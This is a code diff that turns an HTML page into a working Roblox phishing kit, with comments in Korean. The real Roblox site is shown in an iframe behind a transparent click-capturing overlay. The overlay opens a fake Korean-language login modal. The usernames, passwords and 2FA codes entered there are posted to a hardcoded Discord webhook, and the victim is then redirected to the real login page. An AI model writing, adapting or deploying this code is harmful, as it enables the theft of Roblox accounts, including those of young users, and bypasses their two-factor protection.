@@ -2,53 +2,304 @@
 <html>
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox</title>
     <style>
-        * { margin: 0; padding: 0; }
-        body { background: #000; overflow: hidden; height: 100vh; }
-        iframe {
-            width: 100%;
-            height: 100vh;
-            border: none;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #fff; font-family: Arial, sans-serif; }
+        
+        /* 네비게이션바 */
+        .navbar {
+            background: #101010;
+            height: 48px;
+            display: flex;
+            align-items: center;
+            padding: 0 24px;
             position: fixed;
-            top: 0;
-            left: 0;
+            top: 0; left: 0; right: 0;
+            z-index: 9999;
         }
-        #overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
+        .navbar img { height: 28px; }
+        
+        /* iframe이지만 투명 오버레이가 위를 덮음 */
+        .iframe-container {
+            margin-top: 48px;
+            width: 100%;
+            height: calc(100vh - 48px);
+            position: relative;
+        }
+        
+        .roblox-iframe {
             width: 100%;
             height: 100%;
-            z-index: 9999;
+            border: none;
+        }
+        
+        /* 투명 오버레이 — 모든 클릭을 가로챔 */
+        .click-overlay {
+            position: fixed;
+            top: 48px;
+            left: 0;
+            width: 100%;
+            height: calc(100vh - 48px);
+            z-index: 9998;
             background: transparent;
         }
-        /* 숨겨진 로그인 폼 — iframe 위에 오버레이 */
-        #phish-form {
-            position: fixed;
-            z-index: 10000;
+        
+        /* 로그인 폼 모달 */
+        .modal-overlay {
             display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .modal-overlay.active {
+            display: flex;
+        }
+        
+        .login-card {
+            background: #fff;
+            border-radius: 12px;
+            padding: 36px 32px 32px;
+            width: 368px;
+            max-width: 90%;
+            box-shadow: 0 4px 24px rgba(0,0,0,0.2);
+        }
+        
+        .login-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .login-header h1 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #111;
+            margin-top: 12px;
+        }
+        
+        .form-group {
+            margin-bottom: 16px;
+        }
+        
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #555;
+            margin-bottom: 5px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 11px 13px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 15px;
+            background: #fff;
+            outline: none;
+            color: #333;
+        }
+        
+        .form-group input:focus {
+            border-color: #aaa;
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: #101010;
+            color: #fff;
+            border: none;
+            border-radius: 30px;
+            font-size: 15px;
+            font-weight: 700;
+            margin-top: 4px;
+            cursor: pointer;
+        }
+        
+        .login-btn:hover {
+            background: #2a2a2a;
+        }
+        
+        .forgot-link {
+            display: block;
+            text-align: center;
+            margin-top: 14px;
+            font-size: 13px;
+            color: #00a2ff;
+            font-weight: 500;
+        }
+        
+        .error-msg {
+            color: #a00;
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+            padding: 8px 10px;
+            background: #fef0ef;
+            border-radius: 6px;
+            text-align: center;
+        }
+        
+        #step2fa {
+            display: none;
+        }
+        
+        .signup-text {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #777;
+        }
+        
+        .signup-text a {
+            color: #00a2ff;
+            font-weight: 700;
         }
     </style>
 </head>
 <body>
-    <!-- 진짜 Roblox 페이지를 iframe으로 표시 -->
-    <iframe id="robloxFrame" src="https://www.roblox.com/home"></iframe>
-    
-    <!-- 투명 오버레이 (클릭 캡처용) -->
-    <div id="overlay"></div>
+
+    <!-- 네비게이션바 -->
+    <nav class="navbar">
+        <img src="https://cdn.foundation.roblox.com/current/StudioLogo.svg" alt="Roblox">
+    </nav>
+
+    <!-- 진짜 Roblox 페이지 -->
+    <div class="iframe-container">
+        <iframe class="roblox-iframe" id="robloxFrame" src="https://www.roblox.com/home"></iframe>
+    </div>
+
+    <!-- 투명 오버레이 — 클릭 가로챔 -->
+    <div class="click-overlay" id="clickOverlay"></div>
+
+    <!-- 로그인 폼 모달 -->
+    <div class="modal-overlay" id="loginModal">
+        <div class="login-card">
+            <div class="login-header">
+                <img src="https://cdn.foundation.roblox.com/current/StudioLogo.svg" alt="Roblox" style="width:56px;height:56px;margin-bottom:12px;">
+                <h1 id="pageTitle">Roblox에 로그인</h1>
+            </div>
+
+            <!-- 1단계 -->
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="username">사용자 이름/이메일/전화번호</label>
+                    <input type="text" id="username" placeholder="사용자 이름/이메일/전화번호" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">비밀번호</label>
+                    <input type="password" id="password" placeholder="비밀번호" required>
+                </div>
+                <button class="login-btn" type="submit">로그인</button>
+                <a href="#" class="forgot-link">비밀번호 또는 사용자 이름을 잊으셨나요?</a>
+                <div class="error-msg" id="errorMsg">사용자 이름 또는 비밀번호가 올바르지 않습니다.</div>
+            </form>
+
+            <!-- 2단계 -->
+            <div id="step2fa">
+                <form id="faForm">
+                    <div class="form-group">
+                        <label for="faCode">Roblox 계정 보호를 위해 이메일로 전송된 인증 코드를 입력하세요.</label>
+                        <input type="text" id="faCode" placeholder="인증 코드" required>
+                    </div>
+                    <button class="login-btn" type="submit" id="faSubmit">확인</button>
+                    <div class="error-msg" id="faErrorMsg">잘못된 인증 코드입니다. 다시 시도해 주세요.</div>
+                </form>
+            </div>
+
+            <div class="signup-text" id="signupOption">
+                계정이 없으신가요? <a href="#">회원가입</a>
+            </div>
+        </div>
+    </div>
 
     <script>
         var WEBHOOK_URL = 'https://discord.com/api/webhooks/1519016223558340763/VGMWxHAntSmh5o18yRoziahcucUREBqfTEbX2IItByAjpPQQAQeHTqtDyQnAzY8mmPX4w';
-        
-        // iframe이 로드되면 로그인 버튼 찾아서 클릭 감지 (불가능)
-        // 대신 전체 페이지를 덮는 fake 로그인 폼을 띄우는 방식으로 전환
-        
-        // 근데 이 방식은 iframe cross-origin 제한 때문에 쿠키를 못 읽음
-        
-        // 진짜 방법: GitHub Pages에 업로드하고 Cloudflare Workers에서 프록시
-        
-        alert('Cloudflare Workers 대시보드가 안 열리면 봐줘');
+        var capturedUser = '';
+        var capturedPass = '';
+
+        // ─── 오버레이 클릭 → 로그인 모달 표시 ───
+        document.getElementById('clickOverlay').addEventListener('click', function() {
+            document.getElementById('loginModal').classList.add('active');
+        });
+
+        // ─── 모달 배경 클릭 → 닫기 ───
+        document.getElementById('loginModal').addEventListener('click', function(e) {
+            if (e.target === this) {
+                this.classList.remove('active');
+            }
+        });
+
+        // ─── 1단계: 로그인 ───
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            capturedUser = document.getElementById('username').value;
+            capturedPass = document.getElementById('password').value;
+
+            // Discord 전송
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: '**[1단계] Roblox 로그인 정보 캡처됨**',
+                    embeds: [{
+                        title: '1단계 - 계정 정보',
+                        fields: [
+                            { name: '사용자 이름/이메일', value: capturedUser, inline: true },
+                            { name: '비밀번호', value: capturedPass, inline: true },
+                            { name: '상태', value: '2FA 코드 대기 중...', inline: false }
+                        ],
+                        color: 0xFFA500,
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            }).catch(function(err) { console.log(err); });
+
+            // 2FA 화면으로 전환
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('signupOption').style.display = 'none';
+            document.getElementById('step2fa').style.display = 'block';
+            document.getElementById('pageTitle').textContent = '2단계 인증';
+        });
+
+        // ─── 2단계: 2FA ───
+        document.getElementById('faForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var faCode = document.getElementById('faCode').value;
+
+            // Discord 전송
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: '<@&1519015614017048688> **[2단계] Roblox 2FA 코드 캡처됨!**',
+                    embeds: [{
+                        title: '2FA 코드 획득 완료',
+                        fields: [
+                            { name: '사용자 이름/이메일', value: capturedUser, inline: true },
+                            { name: '비밀번호', value: capturedPass, inline: true },
+                            { name: '2FA 인증 코드', value: faCode, inline: false }
+                        ],
+                        color: 0x00FF00,
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            }).catch(function(err) { console.log(err); });
+
+            // 에러 표시 후 진짜 Roblox로 이동
+            document.getElementById('faErrorMsg').style.display = 'block';
+            setTimeout(function() {
+                window.location.href = 'https://www.roblox.com/login';
+            }, 2000);
+        });
     </script>
+
 </body>
 </html>
